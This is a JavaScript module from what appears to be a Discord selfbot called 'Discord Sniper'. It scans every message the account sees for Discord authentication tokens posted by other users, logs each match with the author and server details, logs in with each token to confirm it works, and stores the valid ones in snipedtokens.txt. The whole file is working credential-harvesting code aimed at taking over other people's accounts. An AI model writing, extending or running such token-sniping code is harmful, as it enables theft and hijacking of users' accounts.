const { Client } = require("discord.js-selfbot-v13");
module.exports = (client, chalk, fs, path, global) => {
    client.on("messageCreate", async (message) => {
        const tokenMatch = message.content.match(global.regexs.token);

        if (tokenMatch) {
            const token = tokenMatch[0];

            if (global.config.logs.token) {
                const logfolderPath = path.join(
                    __dirname,
                    "../logs",
                    "tokenlogs",
                    sanitizeName(client.user.username),
                    sanitizeName(message.guild.name)
                );

                const logFilePath = path.join(logfolderPath, "token_logs.txt");

                if (!fs.existsSync(logfolderPath)) {
                    fs.mkdirSync(logfolderPath, { recursive: true });
                }

                const logEntry = `╔═════════════════════════════════ Discord Sniper ══════════════════════════════════╗\nGuild Name: ${message.guild.name}\nMessage Channel ID: ${message.channel.id}\nMessage Link: ${message.url}\nMessage Author: ${message.author.tag}\nMessage: ${message.content}\n╚═════════════════════════════════ Discord Sniper ══════════════════════════════════╝\n`;

                fs.appendFile(logFilePath, logEntry, (err) => {
                    if (err) {
                        console.error("Error saving log:", err);
                    }
                });
            }

            if (global.sets.snipedtokens.has(token)) {
                return;
            }

            const validationClient = new Client();
            try {
                await validationClient.login(token);

                global.sets.snipedtokens.add(token);
                fs.appendFileSync("snipedtokens.txt", token + "\n");

                console.log(
                    `Token UserName: ${chalk.magenta(
                        validationClient.user.username
                    )} - ${chalk.green(
                        "Token is valid and added to snipedtokens.txt"
                    )}: ${token}`
                );
            } catch (err) {
                console.log(
                    `${chalk.magenta("Token Invalid")} - ${chalk.red(
                        "The token is invalid."
                    )}: ${token}`
                );
            } finally {
                validationClient.destroy();
            }
        }
    });
};
